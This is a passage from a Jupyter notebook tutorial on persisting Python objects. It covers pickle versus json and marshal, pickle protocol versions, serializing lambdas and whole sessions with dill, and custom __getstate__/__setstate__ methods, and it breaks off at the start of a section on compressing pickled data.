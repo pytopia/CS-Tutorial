{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"../../images/banners/python-modules.png\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <img src=\"../../images/logos/python.png\" width=\"23\"/> Persist Objects in Python \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"table_of_contents\"></a>\n",
    "## Table of Contents \n",
    "\n",
    "\n",
    "* [Serialization in Python](#serialization_in_python)\n",
    "* [Inside the Python pickle Module](#inside_the_python_pickle_module)\n",
    "* [Protocol Formats of the Python pickle Module](#protocol_formats_of_the_python_pickle_module)\n",
    "* [Picklable and Unpicklable Types](#picklable_and_unpicklable_types)\n",
    "* [Compression of Pickled Objects](#compression_of_pickled_objects)\n",
    "* [Security Concerns With the Python pickle Module](#security_concerns_with_the_python_pickle_module)\n",
    "* [<img src=\"../../images/logos/checkmark.png\" width=\"20\"/> Conclusion](#conclusion)\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As a developer, you may sometimes need to send complex object hierarchies over a network or save the internal state of your objects to a disk or database for later use. To accomplish this, you can use a process called serialization, which is fully supported by the standard library thanks to the Python `pickle` module."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this section, you’ll learn:\n",
    "\n",
    "- What it means to **serialize** and **deserialize** an object\n",
    "- Which **modules** you can use to serialize objects in Python\n",
    "- Which kinds of objects can be serialized with the Python `pickle` module\n",
    "- How to use the Python pickle module to serialize **object hierarchies**\n",
    "- What the **risks** are when deserializing an object from an untrusted source\n",
    "\n",
    "Let’s get pickling!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"serialization_in_python\"></a>\n",
    "## Serialization in Python [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **serialization** process is a way to convert a data structure into a linear form that can be stored or transmitted over a network."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In Python, serialization allows you to take a complex object structure and transform it into a stream of bytes that can be saved to a disk or sent over a network. You may also see this process referred to as **marshalling**. The reverse process, which takes a stream of bytes and converts it back into a data structure, is called **deserialization** or **unmarshalling**."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Serialization can be used in a lot of different situations. One of the most common uses is saving the state of a neural network after the training phase so that you can use it later without having to redo the training."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Python offers three different modules in the standard library that allow you to serialize and deserialize objects:\n",
    "\n",
    "1. The [`marshal`](https://docs.python.org/3/library/marshal.html) module\n",
    "2. The [`json`](https://docs.python.org/3/library/json.html) module\n",
    "3. The [`pickle`](https://docs.python.org/3/library/pickle.html) module"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In addition, Python supports [`XML`](https://www.xml.com/axml/axml.html), which you can also use to serialize objects."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `marshal` module is the oldest of the three listed above. It exists mainly to read and write the compiled bytecode of Python modules, or the `.pyc` files you get when the interpreter imports a Python module. So, even though you can use `marshal` to serialize some of your objects, it’s not recommended."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `json` module is the newest of the three. It allows you to work with standard JSON files. JSON is a very convenient and widely used format for data exchange."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There are several reasons to choose the JSON format: It’s human readable and language independent, and it’s lighter than XML. With the `json` module, you can serialize and deserialize several standard Python types:\n",
    "\n",
    "- `bool`\n",
    "- `dict`\n",
    "- `int`\n",
    "- `float`\n",
    "- `list`\n",
    "- `string`\n",
    "- `tuple`\n",
    "- `None`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The Python `pickle` module is another way to serialize and deserialize objects in Python. It differs from the `json` module in that it serializes objects in a binary format, which means the result is not human readable. However, it’s also faster and it works with many more Python types right out of the box, including your custom-defined objects."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Note:** From now on, you’ll see the terms **pickling** and **unpickling** used to refer to serializing and deserializing with the Python `pickle` module."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, you have several different ways to serialize and deserialize objects in Python. But which one should you use? The short answer is that there’s no one-size-fits-all solution. It all depends on your use case."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here are three general guidelines for deciding which approach to use:\n",
    "\n",
    "1. Don’t use the `marshal` module. It’s used mainly by the interpreter, and the official documentation warns that the Python maintainers may modify the format in backward-incompatible ways.\n",
    "\n",
    "2. The `json` module and XML are good choices if you need interoperability with different languages or a human-readable format.\n",
    "\n",
    "3. The Python `pickle` module is a better choice for all the remaining use cases. If you don’t need a human-readable format or a standard interoperable format, or if you need to serialize custom objects, then go with `pickle`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"inside_the_python_pickle_module\"></a>\n",
    "## Inside the Python pickle Module [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The Python pickle module basically consists of four methods:\n",
    "```python\n",
    "pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)\n",
    "pickle.dumps(obj, protocol=None, *, fix_imports=True, buffer_callback=None)\n",
    "pickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\n",
    "pickle.loads(bytes_object, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The first two methods are used during the pickling process, and the other two are used during unpickling. The only difference between `dump()` and `dumps()` is that the first creates a file containing the serialization result, whereas the second returns a string."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To differentiate `dumps()` from `dump()`, it’s helpful to remember that **the `s` at the end of the function name stands for `string`**. The same concept also applies to `load()` and `loads()`: The first one reads a file to start the unpickling process, and the second one operates on a string."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Consider the following example. Say you have a custom-defined class named `example_class` with several different attributes, each of a different type:\n",
    "\n",
    "- `a_number`\n",
    "- `a_string`\n",
    "- `a_dictionary`\n",
    "- `a_list`\n",
    "- `a_tuple`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The example below shows how you can instantiate the class and pickle the instance to get a plain string. After pickling the class, you can change the value of its attributes without affecting the pickled string. You can then unpickle the pickled string in another variable, restoring an exact copy of the previously pickled class:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This is my pickled object:\n",
      "b'\\x80\\x03c__main__\\nexample_class\\nq\\x00)\\x81q\\x01.'\n",
      "\n",
      "This is a_dict of the unpickled object:\n",
      "{'first': 'a', 'second': 2, 'third': [1, 2, 3]}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# pickling.py\n",
    "import pickle\n",
    "\n",
    "class example_class:\n",
    "    a_number = 35\n",
    "    a_string = \"hey\"\n",
    "    a_list = [1, 2, 3]\n",
    "    a_dict = {\"first\": \"a\", \"second\": 2, \"third\": [1, 2, 3]}\n",
    "    a_tuple = (22, 23)\n",
    "\n",
    "my_object = example_class()\n",
    "\n",
    "my_pickled_object = pickle.dumps(my_object)  # Pickling the object\n",
    "print(f\"This is my pickled object:\\n{my_pickled_object}\\n\")\n",
    "\n",
    "my_object.a_dict = None\n",
    "\n",
    "my_unpickled_object = pickle.loads(my_pickled_object)  # Unpickling the object\n",
    "print(f\"This is a_dict of the unpickled object:\\n{my_unpickled_object.a_dict}\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the example above, you create several different objects and serialize them with `pickle`. This produces a single string with the serialized result."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The pickling process ends correctly, storing your entire instance in this string: `b'\\x80\\x03c__main__\\nexample_class\\nq\\x00)\\x81q\\x01.'`. After the pickling process ends, you modify your original object by setting the attribute `a_dict` to `None.\n",
    "\n",
    "Finally, you unpickle the string to a completely new instance. What you get is a deep copy of your original object structure from the time that the pickling process began."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"protocol_formats_of_the_python_pickle_module\"></a>\n",
    "## Protocol Formats of the Python pickle Module [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As mentioned above, the `pickle` module is Python-specific, and the result of a pickling process can be read only by another Python program. But even if you’re working with Python, it’s important to know that the `pickle` module has evolved over time."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This means that if you’ve pickled an object with a specific version of Python, then you may not be able to unpickle it with an older version. The compatibility depends on the protocol version that you used for the pickling process."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There are currently six different protocols that the Python pickle module can use. The higher the protocol version, the more recent the Python interpreter needs to be for unpickling."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- **Protocol version 0** was the first version. Unlike later protocols, it’s human readable.\n",
    "- **Protocol version 1** was the first binary format.\n",
    "- **Protocol version 2** was introduced in Python 2.3.\n",
    "- **Protocol version 3** was added in Python 3.0. It can’t be unpickled by Python 2.x.\n",
    "- **Protocol version 4** was added in Python 3.4. It features support for a wider range of object sizes and types and is the default protocol starting with Python 3.8.\n",
    "- **Protocol version 5** was added in Python 3.8. It features support for out-of-band data and improved speeds for in-band data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Note: Newer versions of the protocol offer more features and improvements but are limited to higher versions of the interpreter. Be sure to consider this when choosing which protocol to use.\n",
    "\n",
    "To identify the highest protocol that your interpreter supports, you can check the value of the `pickle.HIGHEST_PROTOCOL` attribute."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickle.HIGHEST_PROTOCOL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To choose a specific protocol, you need to specify the protocol version when you invoke `load()`, `loads()`, `dump()` or `dumps()`. If you don’t specify a protocol, then your interpreter will use the default version specified in the `pickle.DEFAULT_PROTOCOL` attribute."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"picklable_and_unpicklable_types\"></a>\n",
    "## Picklable and Unpicklable Types [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You’ve already learned that the Python `pickle` module can serialize many more types than the json module. However, not everything is picklable. The list of unpicklable objects includes database connections, opened network sockets, running threads, and others.\n",
    "\n",
    "If you find yourself faced with an unpicklable object, then there are a couple of things that you can do. The first option is to use a third-party library such as `dill`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `dill` module extends the capabilities of `pickle`. According to the official documentation, it lets you serialize less common types like functions with yields, nested functions, lambdas, and many others."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `dill` module extends the capabilities of `pickle`. According to the official documentation, it lets you serialize less common types like functions with yields, nested functions, lambdas, and many others."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To test this module, you can try to pickle a `lambda` function.\n",
    "\n",
    "If you try to run this program, then you will get an exception because the Python `pickle` module can’t serialize a `lambda` function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "ename": "PicklingError",
     "evalue": "Can't pickle <function <lambda> at 0x7f270c12e200>: attribute lookup <lambda> on __main__ failed",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mPicklingError\u001b[0m                             Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-16-4f62e7f69570>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0msquare\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mx\u001b[0m \u001b[0;34m:\u001b[0m \u001b[0mx\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0mx\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 5\u001b[0;31m \u001b[0mmy_pickle\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpickle\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdumps\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0msquare\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mPicklingError\u001b[0m: Can't pickle <function <lambda> at 0x7f270c12e200>: attribute lookup <lambda> on __main__ failed"
     ]
    }
   ],
   "source": [
    "# pickling_error.py\n",
    "import pickle\n",
    "\n",
    "square = lambda x : x * x\n",
    "my_pickle = pickle.dumps(square)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now try replacing the Python `pickle` module with `dill` to see if there’s any difference.\n",
    "\n",
    "If you run this code, then you’ll see that the `dill` module serializes the `lambda` without returning an error:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x80\\x03cdill._dill\\n_create_function\\nq\\x00(cdill._dill\\n_create_code\\nq\\x01(K\\x01K\\x00K\\x01K\\x02KCC\\x08|\\x00|\\x00\\x14\\x00S\\x00q\\x02N\\x85q\\x03)X\\x01\\x00\\x00\\x00xq\\x04\\x85q\\x05X\\x1f\\x00\\x00\\x00<ipython-input-17-fd95d6aa4b4e>q\\x06X\\x08\\x00\\x00\\x00<lambda>q\\x07K\\x04C\\x00q\\x08))tq\\tRq\\nc__builtin__\\n__main__\\nh\\x07NN}q\\x0bNtq\\x0cRq\\r.'\n"
     ]
    }
   ],
   "source": [
    "# pickling_dill.py\n",
    "import dill\n",
    "\n",
    "square = lambda x: x * x\n",
    "my_pickle = dill.dumps(square)\n",
    "print(my_pickle)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Note:** Before you use `dill` instead of pickle, keep in mind that `dill` is not included in the standard library of the Python interpreter and is typically slower than `pickle`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Another interesting feature of `dill` is that it can even serialize an entire interpreter session. Here’s an example:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    ">>> square = lambda x : x * x\n",
    ">>> a = square(35)\n",
    ">>> import math\n",
    ">>> b = math.sqrt(484)\n",
    ">>> import dill\n",
    ">>> dill.dump_session('test.pkl')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example, you start the interpreter, import a module, and define a `lambda` function along with a couple of other variables. You then import the `dill` module and `invoke dump_session()` to serialize the entire session."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If everything goes okay, then you should get a `test.pkl` file in your current directory:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now you can start a new instance of the interpreter and load the `test.pkl` file to restore your last session:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_items([('__name__', '__main__'), ('__doc__', 'Automatically created module for IPython interactive environment'), ('__package__', None), ('__loader__', None), ('__spec__', None), ('__builtin__', <module 'builtins' (built-in)>), ('__builtins__', <module 'builtins' (built-in)>), ('_ih', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\", 'globals().items()']), ('_oh', {}), ('_dh', ['/mnt/c/Users/hejaz/OneDrive/Desktop/CS-Tutorial/Python/04. Advanced']), ('In', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\", 'globals().items()']), ('Out', {}), ('get_ipython', <bound method InteractiveShell.get_ipython of <ipykernel.zmqshell.ZMQInteractiveShell object at 0x7fd31d000f10>>), ('exit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('quit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('_', ''), ('__', ''), ('___', ''), ('_i', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_ii', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\\n# >>> exit()\"), ('_iii', ''), ('_i1', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\\n# >>> exit()\"), ('square', <function <lambda> at 0x7fd318e25ef0>), ('a', 1225), ('math', <module 'math' from '/home/ali/anaconda3/envs/test/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so'>), ('b', 22.0), ('dill', <module 'dill' from '/home/ali/anaconda3/envs/test/lib/python3.7/site-packages/dill/__init__.py'>), ('_i2', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_i3', '>>> globals().items()')])"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> globals().items()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    ">>> import dill\n",
    ">>> dill.load_session('test.pkl')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_items([('__name__', '__main__'), ('__doc__', 'Automatically created module for IPython interactive environment'), ('__package__', None), ('__loader__', None), ('__spec__', None), ('__builtin__', <module 'builtins' (built-in)>), ('__builtins__', <module 'builtins' (built-in)>), ('_ih', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\"]), ('_oh', {}), ('_dh', ['/mnt/c/Users/hejaz/OneDrive/Desktop/CS-Tutorial/Python/04. Advanced']), ('In', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\"]), ('Out', {}), ('get_ipython', <bound method InteractiveShell.get_ipython of <ipykernel.zmqshell.ZMQInteractiveShell object at 0x7fd31d000f10>>), ('exit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('quit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('_', ''), ('__', ''), ('___', ''), ('_i', \">>> import dill\\n>>> dill.load_session('test.pkl')\"), ('_ii', '>>> globals().items()'), ('_iii', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_i1', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\\n# >>> exit()\"), ('square', <function <lambda> at 0x7fd318e25f80>), ('a', 1225), ('math', <module 'math' from '/home/ali/anaconda3/envs/test/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so'>), ('b', 22.0), ('dill', <module 'dill' from '/home/ali/anaconda3/envs/test/lib/python3.7/site-packages/dill/__init__.py'>), ('_i2', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_i3', '>>> globals().items()'), ('_3', dict_items([('__name__', '__main__'), ('__doc__', 'Automatically created module for IPython interactive environment'), ('__package__', None), ('__loader__', None), ('__spec__', None), ('__builtin__', <module 'builtins' (built-in)>), ('__builtins__', <module 'builtins' (built-in)>), ('_ih', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\"]), ('_oh', {}), ('_dh', ['/mnt/c/Users/hejaz/OneDrive/Desktop/CS-Tutorial/Python/04. Advanced']), ('In', ['', \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\\n# >>> exit()\", \"square = lambda x : x * x\\na = square(35)\\nimport math\\nb = math.sqrt(484)\\nimport dill\\ndill.dump_session('test.pkl')\"]), ('Out', {}), ('get_ipython', <bound method InteractiveShell.get_ipython of <ipykernel.zmqshell.ZMQInteractiveShell object at 0x7fd31d000f10>>), ('exit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('quit', <IPython.core.autocall.ZMQExitAutocall object at 0x7fd31cfe4550>), ('_', ''), ('__', ''), ('___', ''), ('_i', \">>> import dill\\n>>> dill.load_session('test.pkl')\"), ('_ii', '>>> globals().items()'), ('_iii', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_i1', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\\n# >>> exit()\"), ('square', <function <lambda> at 0x7fd318e25f80>), ('a', 1225), ('math', <module 'math' from '/home/ali/anaconda3/envs/test/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so'>), ('b', 22.0), ('dill', <module 'dill' from '/home/ali/anaconda3/envs/test/lib/python3.7/site-packages/dill/__init__.py'>), ('_i2', \">>> square = lambda x : x * x\\n>>> a = square(35)\\n>>> import math\\n>>> b = math.sqrt(484)\\n>>> import dill\\n>>> dill.dump_session('test.pkl')\"), ('_i3', '>>> globals().items()'), ('_3', ...), ('_i4', \">>> import dill\\n>>> dill.load_session('test.pkl')\"), ('_i5', '>>> globals().items()')])), ('_i4', \">>> import dill\\n>>> dill.load_session('test.pkl')\"), ('_i5', '>>> globals().items()')])"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> globals().items()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1225"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "22.0"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<function __main__.<lambda>(x)>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> square"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The first `globals().items()` statement demonstrates that the interpreter is in the initial state. This means that you need to import the `dill` module and call `load_session()` to restore your serialized interpreter session."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Even though `dill` lets you serialize a wider range of objects than `pickle`, it can’t solve every serialization problem that you may have. If you need to serialize an object that contains a database connection, for example, then you’re in for a tough time because it’s an unserializable object even for `dill`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, how can you solve this problem?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The solution in this case is to exclude the object from the serialization process and to **reinitialize** the connection after the object is deserialized."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the following example, you’ll see how you can define a class with several attributes and exclude one attribute from serialization with `__getstate()__`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "# custom_pickling.py\n",
    "import pickle\n",
    "\n",
    "class foobar:\n",
    "    def __init__(self):\n",
    "        self.a = 35\n",
    "        self.b = \"test\"\n",
    "        self.c = lambda x: x * x\n",
    "        \n",
    "    def __getstate__(self):\n",
    "        attributes = self.__dict__.copy()\n",
    "        del attributes['c']\n",
    "        return attributes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'a': 35, 'b': 'test'}\n"
     ]
    }
   ],
   "source": [
    "my_foobar_instance = foobar()\n",
    "my_pickle_string = pickle.dumps(my_foobar_instance)\n",
    "my_new_instance = pickle.loads(my_pickle_string)\n",
    "\n",
    "print(my_new_instance.__dict__)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example, you create an object with three attributes. Since one attribute is a `lambda`, the object is unpicklable with the standard `pickle` module."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To address this issue, you specify what to pickle with `__getstate__()`. You first clone the entire `__dict__` of the instance to have all the attributes defined in the class, and then you manually remove the unpicklable `c` attribute."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you run this example and then deserialize the object, then you’ll see that the new instance doesn’t contain the `c` attribute."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "But what if you wanted to do some additional initializations while unpickling, say by adding the excluded `c` object back to the deserialized instance? You can accomplish this with `__setstate__()`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'a': 35, 'b': 'test', 'c': <function foobar.__setstate__.<locals>.<lambda> at 0x7f2704f81a70>}\n"
     ]
    }
   ],
   "source": [
    "# custom_unpickling.py\n",
    "import pickle\n",
    "\n",
    "class foobar:\n",
    "    def __init__(self):\n",
    "        self.a = 35\n",
    "        self.b = \"test\"\n",
    "        self.c = lambda x: x * x\n",
    "\n",
    "    def __getstate__(self):\n",
    "        attributes = self.__dict__.copy()\n",
    "        del attributes['c']\n",
    "        return attributes\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        self.__dict__ = state\n",
    "        self.c = lambda x: x * x\n",
    "\n",
    "my_foobar_instance = foobar()\n",
    "my_pickle_string = pickle.dumps(my_foobar_instance)\n",
    "my_new_instance = pickle.loads(my_pickle_string)\n",
    "print(my_new_instance.__dict__)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "By passing the excluded `c` object to `__setstate__()`, you ensure that it appears in the `__dict__` of the unpickled string."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"compression_of_pickled_objects\"></a>\n",
    "## Compression of Pickled Objects [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Although the `pickle` data format is a compact binary representation of an object structure, you can still optimize your pickled string by compressing it with `bzip2` or `gzip`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To compress a pickled string with `bzip2`, you can use the `bz2` module provided in the standard library."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the following example, you’ll take a string, pickle it, and then compress it using the `bz2` library:"
   ]
  },
  {
   "cell_type": "code",
